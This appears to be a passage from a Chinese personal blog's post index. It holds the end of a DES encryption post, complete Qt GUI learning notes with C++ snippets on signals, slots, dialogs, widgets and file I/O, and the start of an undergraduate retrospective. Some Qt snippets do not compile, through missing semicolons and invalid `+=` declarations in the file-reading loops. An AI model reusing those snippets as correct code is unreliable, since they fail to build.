最后一轮后，左、右两半部分并未进行交换，而是两部分合并形成一个分组做为末置换的输入。末置换规则如下表：\n\n| 40   | 8    | 48   | 16   | 56   | 24   | 64   | 32   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 39   | 7    | 47   | 15   | 55   | 23   | 63   | 31   |\n| 38   | 6    | 46   | 14   | 54   | 22   | 62   | 30   |\n| 37   | 5    | 45   | 13   | 53   | 21   | 61   | 29   |\n| 36   | 4    | 44   | 12   | 52   | 20   | 60   | 28   |\n| 35   | 3    | 43   | 11   | 51   | 19   | 59   | 27   |\n| 34   | 2    | 42   | 10   | 50   | 18   | 58   | 26   |\n| 33   | 1    | 41   | 9    | 49   | 17   | 57   | 25   |\n\n\n\n\n\n## 参考\n\n[原创\\]密码学基础：DES加密算法-密码应用-看雪论坛-安全社区|安全招聘|bbs.pediy.com](https://bbs.pediy.com/thread-253558.htm#msg_header_h1_0)\n\n[DES加密算法｜密码学｜信息安全 - 哔哩哔哩 (bilibili.com)](https://www.bilibili.com/read/cv13258932?from=note)\n\n[DES加密算法｜密码学｜信息安全_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1KQ4y127AT?from=search&seid=825654170653486270&spm_id_from=333.337.0.0)\n\n[DES算法详解 - songoo - 博客园 (cnblogs.com)](https://www.cnblogs.com/songwenlong/p/5944139.html)\n\n[DES加密算法解析与实现 - luogi - 博客园 (cnblogs.com)](https://www.cnblogs.com/luogi/p/15508933.html)\n\n\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"🔔请输入文章查看码，看更多内容\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["密码学"],"categories":["Crypto"]},{"title":"Qt 学习记录","url":"/posts/3160.html","content":"\n> Qt是一个**跨平台**的C++**图形用户界面应用程序框架**。它为应用程序开发者提供建立艺术级图形界面所需的所有功能。它是完全面向对象的，很容易扩展，并且允许真正的组件编程。\n\n## Qt 基础文件\n\n![初始项目](https://img.jwt1399.top//img/20210706171757.png)\n\n### **xxx.pro**\n\n> **.pro就是工程文件(project)，它是qmake自动生成的用于生产makefile的配置文件**\n\n```c\nQT       += core gui //包含的模块\n\ngreaterThan(QT_MAJOR_VERSION, 4): QT += widgets //大于Qt4版本 才包含widget模块\n\nCONFIG += c++11  //使用c++11的特性\n\n\nDEFINES += QT_DEPRECATED_WARNINGS\n\n# 工程中包含的文件\nSOURCES += \\   //源文件\n    main.cpp \\\n    widget.cpp\n\nHEADERS += \\   //头文件\n    widget.h\n\nFORMS += \\    //设计文件\n    widget.ui\n\n# Default rules for deployment.\nqnx: target.path = /tmp/$${TARGET}/bin\nelse: unix:!android: target.path = /opt/$${TARGET}/bin\n!isEmpty(target.path): INSTALLS += target\n```\n\n### **widget.h**\n\n```c\n#ifndef WIDGET_H\n#define WIDGET_H\n\n#include <QWidget> //包含头文件 QWidget 窗口类\n\nQT_BEGIN_NAMESPACE\nnamespace Ui { class Widget; }\nQT_END_NAMESPACE\n\nclass Widget : public QWidget\n{\n    Q_OBJECT  //Q_OBJECT宏，允许类中使用信号和槽的机制\n\n\npublic:\n    Widget(QWidget *parent = nullptr); //构造函数\n    ~Widget(); //析构函数\n\nprivate:\n    Ui::Widget *ui;\n};\n#endif // WIDGET_H\n```\n\n### main.cpp\n\n```c\n#include \"widget.h\"\n#include <QApplication>\n\n//main程序入口  argc命令行变量的数量  argv命令行变量的数组\nint main(int argc, char *argv[])\n{\n    QApplication a(argc, argv); //a应用程序对象，在Qt中，应用程序对象 有且仅有一个\n    Widget w; //窗口对象  Widget父类  -> QWidget\n    w.show(); //窗口对象 默认不会显示，必须要调用show方法显示窗口\n    return a.exec(); //让应用程序对象进入消息循环\n}\n```\n### widget.cpp\n\n```c\n#include \"widget.h\"\n#include \"ui_widget.h\"\n\nWidget::Widget(QWidget *parent)//构造函数\n    : QWidget(parent)\n    , ui(new Ui::Widget)\n{\n    ui->setupUi(this);\n}\n\nWidget::~Widget() //析构函数\n{\n    delete ui;\n}\n```\n\n## 信号和槽（Signal & Slot）\n\n> 信号和槽是 Qt 的核心，它让两个互不相干的对象连接起来，当一个对象的状态改变时，可以通知另一个对象。在Qt中我们需要使用connect函数进二者的关联。\n\n```c\nconnect(* sender, &signal, * receiver, &slot);\n```\n\n参数解释：\n\n- sender：信号发送者\n\n- signal：发送的信号（函数地址）\n\n- receiver：信号接受者\n\n- slot：处理的槽函数（函数地址）\n\n### 系统自带的信号和槽\n\n**例子：点击按钮，关闭窗口**\n\n```c\n//创建一个按钮 \nQPushButton * btn = new QPushButton(\"关闭窗口\",this);\n//连接信号与槽\nconnect(btn, &QPushButton::clicked, this, &QWidget::close);\n/*\n\tbtn  \t\t\t\t\t\t-信号发送者（这里是按钮）\n\t&QPushButton::clicked \t\t-发送的信号（这里是点击按钮信号）\n\tthis \t\t\t\t\t\t-信号接受者（这里是本窗口Widget）\n\t&QWidget::close \t\t\t-信号接收者收到信号干的事（这里是调用的是关闭窗口的函数）\n*/\n```\n\n### 自定义信号和槽\n\n案例--下课后，老师触发饿了信号，学生响应信号，请客吃饭\n\n```c\n首先定义一个学生类和老师类：\n\t老师类中声明信号 饿了 hungry\nsignals:\n       void hungury();//只需要声明，不需要实现\n\t学生类中声明槽   请客 treat\n\tpublic slots://早期Qt版本 必须要写到public slots，高级版本可以写到 public或者全局下\n       void treat();//需要声明，需要实现\n\t在窗口中声明一个公共方法下课，这个方法的调用会触发老师饿了这个信号，而响应槽函数学生请客\n\tvoid MyWidget::ClassIsOver()\n{\n    //下课函数，调用后，触发老师饿了的信号\n    emit teacher->hungury();\n}\n\t学生响应了槽函数，并且打印信息\n//自定义槽函数 实现\nvoid Student::treat()\n{\n       qDebug() << \"请老师吃饭！\";\n}\n定义对象\n    teacher = new Teacher(this);\n    student = new Student(this);\n\n在窗口中连接信号槽    connect(teacher,&Teacher::hungury,student,&Student::treat);\n并且调用下课函数，测试打印出 “请老师吃饭！”\nClassIsOver();\n```\n\n**自定义信号和发生重载的解决办法**\n\n```c\n自定义的信号 hungry带参数，需要提供重载的自定义信号和 自定义槽\nvoid hungury(QString name);  自定义信号\nvoid treat(QString name );    自定义槽\n但是由于有两个重名的自定义信号和自定义的槽，直接连接会报错，所以需要利用函数指针来指向函数地址， 然后在做连接\nvoid (Teacher:: * teacherSingal)(QString) = &Teacher::hungury;\nvoid (Student:: * studentSlot)(QString) = &Student::treat;\nconnect(teacher,teacherSingal,student,studentSlot);\n```\n\n### Lambda 表达式\n\n> C++11 中的 Lambda 表达式**用于定义并创建匿名的函数对象**，以简化编程工作。用 Lambda 表达式，我们就不需要在类中对槽函数做任何的声明了。Lambda 表达式是 C++ 11 的内容，在比较低的 Qt版本中，要注意在 Pro 项目文件中加入  CONFIG += C++ 11。\n\n**Lambda表达式的基本构成：**\n\n```c\n[capture](parameters) mutable ->return-type\n{\n\tstatement\n}\n//[外部变量访问方式说明符](操作符重载函数参数)mutable ->函数返回值{函数体}\n```\n\n**① 外部变量访问方式说明符**\n\n`[]`，标识一个 Lambda 的开始，这部分必须存在，**不能省略**。**外部变量访问方式说明符**只能使用定义 Lambda 为止时 Lambda 所在作用范围内可见的局部变量（包括 Lambda 所在类的 this）。外部变量访问方式说明符有以下形式：\n\n- `空`。没有使用任何函数对象参数。\n\n- `=`。函数体内可以使用 Lambda 所在作用范围内所有可见的局部变量（包括Lambda所在类的this），并且是**值传递方式**（相当于编译器自动为我们按**值**传递了所有局部变量）。\n\n-  `&`。函数体内可以使用 Lambda 所在作用范围内所有可见的局部变量（包括Lambda所在类的this），并且是**引用传递方式**（相当于编译器自动为我们按**引用**传递了所有局部变量）。\n\n- `this`。函数体内可以使用 Lambda 所在类中的成员变量。\n\n- `a`。将 a 按值进行传递。按值进行传递时，函数体内不能修改传递进来的 a 的拷贝，因为默认情况下函数是const 的。**要修改传递进来的 a 的拷贝**，可以添加 **mutable** 修饰符。\n\n- `&a`。将 a 按引用进行传递。\n\n- `a, &b`。将 a 按值进行传递，b 按引用进行传递。\n\n- `=，&a, &b`。除 a 和 b 按引用进行传递外，其他参数都按值进行传递。\n\n- `&, a, b`。除 a 和 b 按值进行传递外，其他参数都按引用进行传递。\n\n**② 操作符重载函数参数**\n\n标识重载的 () 操作符的参数，没有参数时，这部分可以省略。参数可以通过按值（如：(a,b)）和按引用（如：(&a,&b)）两种方式进行传递。\n\n**③ 可修改标示符**\n\n`mutable`，这部分可以省略。按值传递函数对象参数时，加上 mutable 修饰符后，可以修改按值传递进来的拷贝（**注意是能修改拷贝，而不是值本身**）。\n\n```c\nQPushButton * myBtn = new QPushButton (this);\nQPushButton * myBtn2 = new QPushButton (this);\nmyBtn2->move(100,100);\nint m = 10;\n\nconnect(myBtn,&QPushButton::clicked,this,[m] ()mutable { m = 100 + 10; qDebug() << m; });//m=110\nconnect(myBtn2,&QPushButton::clicked,this,[=] ()  { qDebug() << m; });//m=10\nqDebug() << m;//m=10\n\n```\n\n**④ 函数返回值**\n\n`->返回值类型`，标识函数返回值的类型，当返回值为void，或者函数体中只有一处 return 的地方（此时编译器可以自动推断出返回值类型）时，这部分可以省略。\n\n```c\nint ret = []()->int{return 1000}();\nqDebug() << \"ret=\" << ret; //ret=1000\n```\n\n**⑤ 函数体**\n\n  {}，标识函数的实现，这部分不能省略，但函数体可以为空。\n\n**扩展知识： 按值传递与按引用传递的区别？**\n\n按值传递，不会改变当前调用函数里实参，按引用传值，会改变调用里面实参。 按值传递，可以保护实参不被修改，效率比较低。 按引用传值，本质是传递一个指针指向地址值，实参会发生修改，效率更高。\n\n## QMainWindow\n\nQMainWindow是一个为用户提供主窗口程序的类，包含一个菜单栏（menu bar）、多个工具栏(tool bars)、多个锚接部件(dock widgets)、一个状态栏(status bar)及一个中心部件(central widget)，是许多应用程序的基础，如文本编辑器，图片编辑器等。\n\n![](https://img.jwt1399.top//img/20210703152943.png)\n\n### 菜单栏（QMenuBar）\n\n一个主窗口最多只有一个菜单栏。位于主窗口顶部、主窗口标题栏下面。\n\n```c\n//创建菜单 只能一个\nQMenuBar * bar =  menuBar();\n//添加到窗口中\nsetMenuBar(bar);\n//菜单栏\nQMenu * fileMenu = bar->addMenu(\"文件\");\nQMenu * editMenu = bar->addMenu(\"编辑\");\n//菜单项\nQAction * newAction = fileMenu->addAction(\"新建\");\n//添加分割线\nfileMenu->addSeparator();\nQAction * openAction = fileMenu->addAction(\"打开\");\n```\n\n![菜单栏效果图](https://img.jwt1399.top//img/20210703153740.png)\n\n### 工具栏（QToolBar）\n\n主窗口的工具栏上可以有多个工具条，通常采用一个菜单对应一个工具条的的方式，也可根据需要进行工具条的划分。\n\n- 直接调用QMainWindow类的addToolBar（）函数获取主窗口的工具条对象，每增加一个工具条都需要调用一次该函数。\n\n- 插入属于工具条的动作，即在工具条上添加操作。通过QToolBar类的addAction函数添加。\n\n-  工具条是一个可移动的窗口，它的停靠区域由QToolBar的allowAreas决定，包括：\n  - Qt::LeftToolBarArea   停靠在左侧\n  -  Qt::RightToolBarArea   停靠在右侧\n  -  Qt::TopToolBarArea    停靠在顶部\n  - Qt::BottomToolBarArea   停靠在底部\n  - Qt::AllToolBarAreas   以上四个位置都可停靠\n\n- 使用setAllowedAreas（）函数指定停靠区域：\n\n`setAllowedAreas（Qt::LeftToolBarArea | Qt::RightToolBarArea）`\n\n- 使用setMoveable（）函数设定工具栏的可移动性：\n\n`setMoveable（false）`//工具条不可移动, 只能停靠在初始化的位置上\n\n代码承接上面菜单栏部分代码\n\n```c\n//创建工具栏 可以多个\nQToolBar * toolBar = new QToolBar(this);\n//添加到窗口，设置默认停靠区域\naddToolBar(Qt::LeftToolBarArea,toolBar);\n//设置允许的停靠区域 左右停靠\ntoolBar->setAllowedAreas(Qt::LeftToolBarArea | Qt::RightToolBarArea);\n//设置浮动 不可浮动\ntoolBar->setFloatable(false);\n//设置移动 不可移动\ntoolBar->setMovable(false);\n//工具栏\ntoolBar->addAction(newAction);\ntoolBar->addSeparator(); //添加分割线\ntoolBar->addAction(openAction);\n//工具栏添加控件\nQPushButton * btn = new QPushButton(\"按钮\",this);\ntoolBar->addWidget(btn);\n```\n\n![工具栏效果图](https://img.jwt1399.top//img/20210703155003.png)\n\n### 状态栏（QStatusBar）\n\nQStatusBar 派生自 QWidget 类，使用方法与 QWidget 类似，状态栏只能有一个。\n\n代码承接上面\n\n```c\n//创建状态栏 只能一个\nQStatusBar *stBar = statusBar();\n//设置到窗口中\nsetStatusBar(stBar);\n//状态栏添加标签控件\nQLabel * label = new QLabel(\"提示信息\",this);\nstBar->addWidget(label);\nQLabel * label2 = new QLabel(\"右侧提示信息\",this);\nstBar->addPermanentWidget(label2);\n```\n\n![状态栏效果图](https://img.jwt1399.top//img/20210703155435.png)\n\n### 铆接部件（QDockWidget）\n\n铆接部件 QDockWidget，也称浮动窗口，可以有多个。\n\n```c\n//浮动窗口 可以多个\nQDockWidget * dockWidget = new QDockWidget(\"浮动窗口\",this);\n//设置到窗口中\naddDockWidget(Qt::BottomDockWidgetArea,dockWidget);\n//设置允许的停靠区域 上下停靠\ndockWidget->setAllowedAreas(Qt::TopDockWidgetArea | Qt::BottomDockWidgetArea);\n```\n\n![浮动窗口效果图](https://img.jwt1399.top//img/20210703155733.png)\n\n### 中心部件（CentralWidget）\n\n除了以上几个部件，中心显示的部件都可以作为核心部件，例如一个记事本文件，可以利用QTextEdit做核心部件，中心部件只能有一个。\n\n```c\n//设置中心部件 只能一个\nQTextEdit * edit =new  QTextEdit(this);\nsetCentralWidget(edit);\n```\n\n![中心部件效果图](https://img.jwt1399.top//img/20210703160052.png)\n\n## 资源文件添加\n\n1.将图片文件拷贝到项目位置下\n\n2.右键项目->添加新文件 –> Qt - > Qt recourse File  - >给资源文件起名xxx，创建后生成  xxx.qrc \n\n3.右键 xxx.qrc ，选择 open in editor 编辑资源，添加前缀、添加文件\n\n4.使用Qt资源  “ : + 前缀名 + 文件名 ”  eg：`ui->actionnew->setIcon(QIcon(\":/icon/image/jj.ico\"));`\n\n## 对话框（QDialog）\n\n对话框分为模态对话框和非模态对话框。模态对话框，会阻塞同一应用程序中其它窗口的输入。非模态对话框，不会阻塞同一应用程序中其它窗口的输入。\n\n模态对话框很常见，比如“打开文件”功能。你可以尝试一下记事本的打开文件，当打开文件对话框出现时，我们是不能对除此对话框之外的窗口部分进行操作的。非模态对话框，例如查找对话框，我们可以在显示着查找对话框的同时，继续对记事本的内容进行编辑。\n\n### 模态对话框\n\n```c\n//模态对话框\nconnect(ui->actionnew,&QAction::triggered,[=](){\n    QDialog dlg(this); \n    dlg.resize(300,100);//设置对话框大小\n    dlg.setWindowTitle(tr(\"Hello, Model dialog!\"));//设置对话框标题\n    dlg.setWindowIcon(QIcon(\":/icon/image/jj.ico\")); //设置对话框图标\n    dlg.exec();\n    qDebug() << \"模态对话框弹出了\";\n});\n```\n\n![模态对话框](https://img.jwt1399.top//img/20210704094358.png)\n\n### 非模态对话框\n\n```c\n//非模态对话框\nconnect(ui->actionnew,&QAction::triggered,[=](){\n    QDialog * dlg = new QDialog (this); //防止一闪而过，创建到堆区\n    dlg->resize(300,100); //设置对话框大小\n    dlg->setWindowTitle(tr(\"Hello, Modeless dialog!\")); //设置对话框标题\n    dlg->setWindowIcon(QIcon(\":/icon/image/jj.ico\")); //设置对话框图标\n    dlg->show();\n    dlg->setAttribute(Qt::WA_DeleteOnClose); // 55号属性 对话框关闭时，自动销毁对话框。\n    qDebug() << \"非模态对话框弹出了\";\n});\n```\n\n![非模态对话框](https://img.jwt1399.top//img/20210704094508.png)\n\n## 标准对话框\n\n> 标准对话框，是 Qt 内置的一系列对话框，用于简化开发。事实上，有很多对话框都是通用的，比如打开文件、设置颜色、打印设置等。这些对话框在所有程序中几乎相同，因此没有必要在每一个程序中都自己实现这么一个对话框。\n\nQt 的内置对话框大致分为以下几类：\n\n- QColorDialog：    选择颜色；\n- QFileDialog：    选择文件或者目录；\n- QFontDialog：    选择字体；\n- QInputDialog：    允许用户输入一个值，并将其值返回；\n- QMessageBox：     模态对话框，用于显示信息、询问问题等；\n- QPageSetupDialog：  为打印机提供纸张相关的选项；\n- QPrintDialog：    打印机配置；\n- QPrintPreviewDialog：打印预览；\n- QProgressDialog：  显示操作过程。\n\n### 消息对话框（QMessageBox）\n\n```c\n//消息对话框\nconnect(ui->actionopen,&QAction::triggered,[=](){\n    //错误对话框\n    QMessageBox::critical(this,\"错误对话框\",\"错误信息\");\n\n    //信息对话框\n    QMessageBox::information(this,\"提示对话框\",\"提示信息\");\n\n    //提问对话框\n    //参数1:父亲  参数2:标题  参数3:提示内容  参数4:按键类型  参数5:默认关联回车按键\n    QMessageBox::question(this,\"提问对话框\",\"提问信息\",QMessageBox::Save|QMessageBox::Cancel);\n\n    //警告对话框\n    QMessageBox::warning(this,\"警告对话框\",\"警告信息\");\n\n    //关于对话框\n    QMessageBox::about(this,\"关于\",\"By 简简\");\n    QMessageBox::aboutQt(this);\n});\n```\n\n### 颜色对话框（QColorDialog）\n\n```c\nQColor color =  QColorDialog::getColor(QColor(255,0,0));\nqDebug() << \"r = \" << color.red() << \" g = \" << color.green() << \" b  = \" << color.blue() ;\n```\n\n### 文件对话框（QFileDialog）\n\n```c\n//参数1:父亲  参数2:标题   参数3:默认打开路径  参数4:过滤文件格式     \nQString str = QFileDialog::getOpenFileName(this,\"打开文件\",\"C:\\\\Users\\\\admin\\\\Desktop\",\"(*.txt)\");\nqDebug() << str; // 返回值是选取的路径\n```\n\n### 字体对话框（QFontDialog）\n\n```c\nbool  flag;\nQFont font = QFontDialog::getFont(&flag,QFont(\"华文彩云\",36));\nqDebug() << \"字体:\"<< font.family().toUtf8().data() << \"字号:\" << font.pointSize() << \"是否加粗:\" << font.bold() << \"是否倾斜:\" << font.italic();\n```\n\n## 常用控件\n\n### Buttons\n\n-  **常用按钮(Push Button)** QPushButton\n\n- **工具按钮(Tool Button)** QToolButton  用于显示图片，如果想显示文字，修改风格：toolButtonStyle ， 凸起风格autoRaise\n\n-  **单选按钮(Radio Button)** QRadioButton，设置默认 ui->rBtnMan->setChecked(true); \n\n- **多选按钮(Check Box)**  QCheckBox ，监听状态，2 选中 1 半选 0 未选中\n\n```c\n    //设置单选按钮 男默认选中\n    ui->rBtnMan->setChecked(true);\n\n    //选中女后 打印信息\n    connect(ui->rBtnWoman,&QRadioButton::clicked,[=](){\n        qDebug() << \"选中了女了！\";\n    });\n\n    //多选按钮  2是选中  0是未选中 1是半选\n    connect(ui->cBox,&QCheckBox::stateChanged,[=](int state){\n        qDebug() << state;\n    });\n```\n\n\n\n### Item Widgets\n\n#### 列表容器(List Widget) QListWidget \n\n- QListWidgetItem * item 一行内容 \n\n- ui->listWidget ->addItem ( item )\n\n- 设置居中方式item->setTextAlignment(Qt::AlignHCenter);\n\n- 可以利用addItems一次性添加整个诗内容\n\n```c\n    //利用listWidget写诗\n    QListWidgetItem * item = new QListWidgetItem(\"锄禾日当午\");\n    //将一行诗放入到listWidget控件中\n    ui->listWidget->addItem(item);\n    item->setTextAlignment(Qt::AlignHCenter);\n```\n\n#### 树控件(Tree Widget)  QTreeWidget\n\n- 设置头： ui->treeWidget->setHeaderLabels(QStringList()<< \"英雄\"<< \"英雄介绍\");\n\n- 创建根节点： QTreeWidgetItem * liItem = new QTreeWidgetItem(QStringList()<< \"力量\");\n\n- 添加根节点 到 树控件上：ui->treeWidget->addTopLevelItem(liItem);\n\n- 添加子节点： liItem->addChild(l1);\n\n```c\n    //treeWidget树控件使用\n\n    //设置水平头\n    ui->treeWidget->setHeaderLabels(QStringList()<< \"英雄\"<< \"英雄介绍\");\n\n    QTreeWidgetItem * liItem = new QTreeWidgetItem(QStringList()<< \"力量\");\n    QTreeWidgetItem * minItem = new QTreeWidgetItem(QStringList()<< \"敏捷\");\n    QTreeWidgetItem * zhiItem = new QTreeWidgetItem(QStringList()<< \"智力\");\n    //加载顶层的节点\n    ui->treeWidget->addTopLevelItem(liItem);\n    ui->treeWidget->addTopLevelItem(minItem);\n    ui->treeWidget->addTopLevelItem(zhiItem);\n\n    //追加子节点\n    QStringList heroL1;\n    heroL1 << \"刚被猪\" << \"前排坦克，能在吸收伤害的同时造成可观的范围输出\";\n    QTreeWidgetItem * l1 = new QTreeWidgetItem(heroL1);\n    liItem->addChild(l1);\n```\n\n#### 表格控件(Table Widget) QTableWidget\n\n- 设置列数 ：ui->tableWidget->setColumnCount(3);\n\n- 设置水平表头：ui->tableWidget->setHorizontalHeaderLabels(QStringList()<<\"姓名\"<< \"性别\"<< \"年龄\");\n\n- 设置行数：ui->tableWidget->setRowCount(5);\n- 设置正文：ui->tableWidget->setItem(0,0, new QTableWidgetItem(\"亚瑟\"));\n\n```c\n//TableWidget控件\n    //设置列数\n    ui->tableWidget->setColumnCount(3);\n\n    //设置水平表头\n    ui->tableWidget->setHorizontalHeaderLabels(QStringList()<<\"姓名\"<< \"性别\"<< \"年龄\");\n\n    //设置行数\n    ui->tableWidget->setRowCount(5);\n\n    //设置正文\n    //ui->tableWidget->setItem(0,0, new QTableWidgetItem(\"亚瑟\"));\n    QStringList nameList;\n    nameList<< \"亚瑟\"<< \"赵云\"<< \"张飞\"<< \"关羽\" << \"花木兰\";\n\n    QList<QString> sexList;\n    sexList << \"男\"<< \"男\"<< \"男\"<< \"男\"<< \"女\";\n\n    for(int i = 0 ; i < 5 ;i ++)\n    {\n        int col = 0;\n        ui->tableWidget->setItem(i,col++, new QTableWidgetItem(nameList[i]));\n        ui->tableWidget->setItem(i,col++, new QTableWidgetItem(sexList.at(i)));\n        //int 转 QString\n        ui->tableWidget->setItem(i,col++, new QTableWidgetItem( QString::number(i+18)));\n    }\n```\n\n### Others\n\n**栈控件(Stacked Widget )**  \n\n`ui->stackedWidget->setCurrentIndex(1);`\n\n**下拉框(Combo Box)** \n\n `ui->comboBox->addItem(\"奔驰\");`\n\n **标签(Label )**  QLabel \n\n```c\n    //利用QLabel显示图片\n    ui->lbl_Image->setPixmap(QPixmap(\":/Image/butterfly.png\"));\n\n    //利用QLabel显示 gif动态图片\n    QMovie * movie = new QMovie(\":/Image/mario.gif\");\n    ui->lbl_movie->setMovie(movie);\n    //播放动图\n    movie->start();\n```\n\n## 文件读写（QFile | QTextStream）\n\n> Q t当中使用 QFile 类对文件进行读写操作，对文本文件也可以与 QTextStream 一起使用，这样读写操作会更加简便。QFileInfo 可以用来获取文件的信息。QDir 可以用于对文件夹进行操作。\n\n### 文件读操作\n\n#### 1、使用QFile类\n\n```c\n//获取文件路径\n//参数1:父亲  参数2:标题   参数3:默认打开路径\nQString path = QFileDialog::getOpenFileName(this,\"打开文件\",\"C:\\\\Users\\\\admin\\\\Desktop\");\nQFile file(path); //path参数就是读取文件的路径\n//设置打开方式\nfile.open(QIODevice::ReadOnly);\n//一次读取所有\nQByteArray array = file.readAll(); \nQString str = QString(array);//类型转换\n\n\n//按行读\nwhile(!file.atEnd())//atEnd()判断是否读到文件尾\n{\n    QByteArray array += file.readLine(); \n    QString str = QString(array);//类型转换\n}\n\n//对文件对象进行关闭\nfile.close();\n```\n\n`QFile::open()` 函数打开文件时需要传递 `QIODevice::OpenModeFlag` 枚举类型的参数，决定文件以什么方式打开，`QIODevice::OpenModeFlag` 类型的主要取值如下：\n\n- QIODevice::ReadOnly：以只读方式打开文件，用于载入文件。\n- QIODevice::WriteOnly：以只写方式打开文件，用于保存文件。\n- QIODevice::ReadWrite：以读写方式打开。\n- QIODevice::Append：    以添加模式打开，新写入文件的数据添加到文件尾部。\n- QIODevice::Truncate：  以截取方式打开文件，文件原有的内容全部被删除。\n- QIODevice::Text：          以文本方式打开文件，读取时“\\n”被自动翻译为换行符，写入时字符串结束符会自动翻译为系统平台的编码，如 Windows 平台下是“\\r\\n”。\n\n这些取值可以组合，例如 `QIODevice::ReadOnly | QIODevice::Text` 表示以只读和文本方式打开文件。\n\nQt默认使用utf-8的编码方式，在Linux中一般没有问题，因为Linux默认也是用utf-8。不过Windows里一般用的是gb18030，所以除非我们明确将文件保存成utf-8编码，否则在Qt代码里需要对编码做一些转换操作：\n\n```c\nQString path = QFileDialog::getOpenFileName(this,\"打开文件\",\"C:\\\\Users\\\\admin\\\\Desktop\");\nQFile file(path); \nfile.open(QIODevice::ReadOnly);\nQByteArray array = file.readAll(); \nQTextCodec * codec = QTextCodec::codecForName(\"gb18030\");\nQString str = codec->toUnicode(array);//类型转换\nfile.close();\n```\n\n#### 2、使用QTextStream类\n\n```c\nQString path = QFileDialog::getOpenFileName(this,\"打开文件\",\"C:\\\\Users\\\\admin\\\\Desktop\");\nQFile file(path); \nfile.open(QIODevice::ReadOnly);\nQTextStream in(&file)\nwhile(!in.atEnd())\n{\n   QString str += in.readLine();\n}\nfile.close();\n```\n\n### 文件写操作\n\n#### 1、使用QFile类\n\n```c\nfile.open(QIODevice::Append); //用追加方式进行写\nfile.write(\"测试\");\nfile.close();\n```\n\n#### 2、使用QTextStream类\n\n```c\nfile.open(QIODevice::Append); //用追加方式进行写\nQTextStream out(&file)\nQString str = \"测试\";\nout << str;\nfile.close();\n```\n\n### 文件信息读取（QFileInfo）\n\n使用 QFileInfo 获取文件的有关信息。QFileInfo 有很多类型的函数。比如：\n\n- size() 文件大小；\n- fileName() 文件路径；\n- created() 创建日期；\n- lastModified() 最后修改日期；\n\n- isDir() 检查该文件是否是目录；\n\n- isExecutable()  检查该文件是否是可执行文件等。\n\n- baseName()  可以直接获得文件名；\n\n- completeBaseName()  获取完整的文件名\n\n- suffix()  则直接获取文件后缀名。\n\n- completeSuffix()  获取完整的文件后缀\n\n```c\n//QFileInfo 文件信息类\nQFileInfo info(path);\n\nqDebug() << \"大小：\" << info.size() << \" 后缀名：\" << info.suffix() << \" 文件名称：\"<<info.fileName() << \" 文件路径：\"<< info.filePath();\nqDebug() << \"创建日期：\" << info.created().toString(\"yyyy/MM/dd hh:mm:ss\");\nqDebug() << \"最后修改日期：\"<<info.lastModified().toString(\"yyyy-MM-dd hh:mm:ss\");\n});\n```\n\n## 编码转换\n\nQString -> QByteArray         QString.toUtf8();\n\nQByteArray->QString           QString(QByteArray)          \n\nQByteArray -> std::string     QByteArray.toStdString();\n\nstd::string -> char *              string.data();\n\n## Qt资源\n\n- [Qt Material Design Desktop Widgets ](https://github.com/laserpants/qt-material-widgets)：基于Qt Widgets的Material风格控件库\n\n- [qskinny](https://github.com/uwerat/qskinny)：Qt 场景图顶部的轻量级框架\n\n- [QssStylesheetEditor ](https://github.com/hustlei/QssStylesheetEditor): 一个功能强大的 Qt 样式表(QSS)编辑器，支持实时预览，自动提示，自定义变量, 支持预览自定义ui代码，引用QPalette等功能。\n\n- [Qt-ShowyWidgets ](https://github.com/iwxyi/Qt-ShowyWidgets)：个人开发的各种花里胡哨的Qt控件集合 \n\n# 赞助💰\n\n如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Qt"],"categories":["Course"]},{"title":"本科四年总结","url":"/posts/26375.html","content":"\n四年光阴，恰如烟火。作此文时，我的本科大学生活已经结束。求学蓉城，筑梦西华，始于2017年初秋，终于2021年盛夏，目之所及，皆是回忆，心之所向，皆是过往。在西华的四年里，曾有过困顿，有过低落，有过对未来的迷茫，但也有过坚定，有过拼搏，有过对未来的向往。留下的是灿烂青春和满溢收获，纵有万般不舍，但终须一别。\n\n## ①大一\n\n时间：2017.09-2018.07\n\n> 2017年高考发挥不佳，比平时模考的分数低了不少，填报志愿时也不是很懂，通过自己分析填报了几个学校，第一志愿填了西华，觉得西华在成都，校园环境也挺好的，那时选择信息安全专业，也仅仅是认为计算机行业比较赚钱，尽管当时对一切都很懵懂，但我仍然对大学生活充满期待，想着离开小镇去往大城市生活该是多么美好啊！\n\n### 大学前奏\n\n大学以前我都是比较沉默寡言的人，不善与人交流，所以心里想着大学来一定要做些改变。大一入学竞选了班长，想以此为契机来改变自己，但我曾多次因为事务繁琐和其他种种原因想过放弃，每次都坚持过来了，没成想就当了四年，现在想来当班长我真的收获了很多，我接触和认识了很多优秀的人，让我更加有耐心了，处理事情的能力变强了，与人沟通的能力也得到了提升，但我一直不认为我是一个合格的班长，更强的领导力和交流能力是需要我不断去努力Get，因为同学们的支持，大一学年我获得了校级优秀学生干部。入学之后还是很快熟悉了大学生活，每天按部就班的上课，开会，忙各种琐碎的事。入学后递交了入党申请书，大一下被选为了入党积极分子，参加了学校的党校学习，顺利结业并获得第四十期党校优秀学员。\n\n### 